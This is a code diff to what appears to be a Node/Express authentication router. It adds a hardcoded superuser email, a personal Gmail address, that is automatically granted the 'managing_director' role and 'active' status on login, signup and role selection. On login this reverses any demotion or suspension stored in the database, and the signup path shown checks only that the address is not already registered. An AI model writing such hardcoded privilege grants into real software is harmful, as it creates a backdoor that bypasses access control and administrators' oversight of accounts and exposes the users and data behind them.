@@ -10,11 +10,7 @@ import bcrypt from 'bcryptjs';
 import crypto from 'node:crypto';
 import { asyncHandler, AppError } from '../middleware/errorHandler';
 import authMiddleware from '../middleware/auth.js';
-import {
-  clearCsrfToken,
-  issueCsrfToken,
-  requireDoubleSubmitCsrf,
-} from '../middleware/csrf.js';
+import { clearCsrfToken, issueCsrfToken, requireDoubleSubmitCsrf } from '../middleware/csrf.js';
 import type { AuthRequest } from '../middleware/auth';
 import { JWT_SECRET, JWT_EXPIRES_SECONDS, BCRYPT_ROUNDS } from '../config/env';
 import { prisma } from '../database.js';
@@ -24,6 +20,7 @@ import { verifyFirebaseIdToken, FirebaseAdminInitError } from '../config/firebas
 
 const router = Router();
 const db = prisma as any;
+const SUPERUSER_EMAIL = 'arslanmalikgoraha@gmail.com';
 
 // ─── TOTP (RFC 6238) helpers — no external dependencies ─────────────────────
 
@@ -377,9 +374,18 @@ router.post(
       return;
     }
 
+    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL;
+    const effectiveUser =
+      isSuperuser && (user.role !== 'managing_director' || user.status !== 'active')
+        ? await prisma.user.update({
+            where: { id: user.id },
+            data: { role: 'managing_director', status: 'active' },
+          })
+        : user;
+
     // Generate JWT token
     const token = jwt.sign(
-      { id: user.id, email: user.email, role: user.role },
+      { id: effectiveUser.id, email: effectiveUser.email, role: effectiveUser.role },
       JWT_SECRET,
       JWT_SIGN_OPTIONS
     );
@@ -387,8 +393,8 @@ router.post(
     // Generate, hash, and persist refresh token; encode userId in cookie for efficient lookup
     const rawRefreshToken = crypto.randomBytes(32).toString('hex');
     const refreshTokenHash = await bcrypt.hash(rawRefreshToken, BCRYPT_ROUNDS);
-    await prisma.user.update({ where: { id: user.id }, data: { refreshTokenHash } });
-    res.cookie('refresh_token', `${user.id}:${rawRefreshToken}`, {
+    await prisma.user.update({ where: { id: effectiveUser.id }, data: { refreshTokenHash } });
+    res.cookie('refresh_token', `${effectiveUser.id}:${rawRefreshToken}`, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict',
@@ -404,12 +410,17 @@ router.post(
       data: {
         type: 'system',
         action: 'login',
-        description: `${user.name || user.email} logged in`,
-        userId: user.id,
+        description: `${effectiveUser.name || effectiveUser.email} logged in`,
+        userId: effectiveUser.id,
         metadata: { ip, userAgent } as Prisma.InputJsonValue,
       },
     });
-    logger.info('Login successful', { userId: user.id, email: user.email, ip, userAgent });
+    logger.info('Login successful', {
+      userId: effectiveUser.id,
+      email: effectiveUser.email,
+      ip,
+      userAgent,
+    });
 
     res.status(200).json({
       success: true,
@@ -417,12 +428,13 @@ router.post(
       data: {
         token,
         user: {
-          id: user.id,
-          email: user.email,
-          name: user.name,
-          role: user.role,
-          department: user.department,
-          photoUrl: user.photoUrl,
+          id: effectiveUser.id,
+          email: effectiveUser.email,
+          name: effectiveUser.name,
+          role: effectiveUser.role,
+          status: effectiveUser.status,
+          department: effectiveUser.department,
+          photoUrl: effectiveUser.photoUrl,
         },
       },
     });
@@ -468,7 +480,10 @@ router.post(
     }
 
     // Check if user already exists
-    const existing = await prisma.user.findUnique({ where: { email: email.toLowerCase().trim() } });
+    const normalizedEmail = String(email).toLowerCase().trim();
+    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL;
+
+    const existing = await prisma.user.findUnique({ where: { email: normalizedEmail } });
     if (existing) {
       throw new AppError('Email already registered', 409);
     }
@@ -490,7 +505,10 @@ router.post(
     let assignedRole = 'agent';
     let assignedStatus: 'active' | 'pending' = 'active';
 
-    if (normalizedCategory === 'client') {
+    if (isSuperuser) {
+      assignedRole = 'managing_director';
+      assignedStatus = 'active';
+    } else if (normalizedCategory === 'client') {
       if (!normalizedRole || !clientRoles.has(normalizedRole)) {
         throw new AppError(
           'Client signup requires a valid role: buyer, seller, landlord, or tenant',
@@ -510,7 +528,7 @@ router.post(
     try {
       user = await prisma.user.create({
         data: {
-          email: email.toLowerCase().trim(),
+          email: normalizedEmail,
           name: name ? sanitizeString(name.trim()) : null,
           role: assignedRole,
           phone: phone ? sanitizeString(String(phone).trim()) : null,
@@ -1071,7 +1089,7 @@ router.post(
           name: resolvedName || user.name,
           photoUrl: resolvedPhotoUrl || user.photoUrl,
           role: isManagingDirector ? 'managing_director' : user.role,
-          status: 'active',
+          status: isManagingDirector ? 'active' : user.status || 'active',
         },
       });
     } else {
@@ -1130,6 +1148,7 @@ router.post(
           email: user.email,
           name: user.name,
           role: user.role,
+          status: user.status,
           department: user.department,
           photoUrl: user.photoUrl,
         },
@@ -2089,8 +2108,19 @@ router.post(
     const userId = req.user?.id;
     if (!userId) throw new AppError('Not authenticated', 401);
 
+    const currentUser = await prisma.user.findUnique({
+      where: { id: userId },
+      select: { id: true, email: true },
+    });
+
+    if (!currentUser) {
+      throw new AppError('User not found', 404);
+    }
+
+    const isSuperuser = currentUser.email.toLowerCase().trim() === SUPERUSER_EMAIL;
+
     const { role, category } = req.body;
-    if (!category || !role) {
+    if (!isSuperuser && (!category || !role)) {
       throw new AppError('category and role are required', 400);
     }
 
@@ -2101,7 +2131,10 @@ router.post(
     let assignedRole: string;
     let assignedStatus: 'active' | 'pending' = 'active';
 
-    if (normalizedCategory === 'client') {
+    if (isSuperuser) {
+      assignedRole = 'managing_director';
+      assignedStatus = 'active';
+    } else if (normalizedCategory === 'client') {
       if (!normalizedRole || !clientRoles.has(normalizedRole)) {
         throw new AppError(
           'Client signup requires a valid role: buyer, seller, landlord, or tenant',
@@ -2147,6 +2180,7 @@ router.post(
           email: user.email,
           name: user.name,
           role: user.role,
+          status: user.status,
           department: user.department,
         },
       },
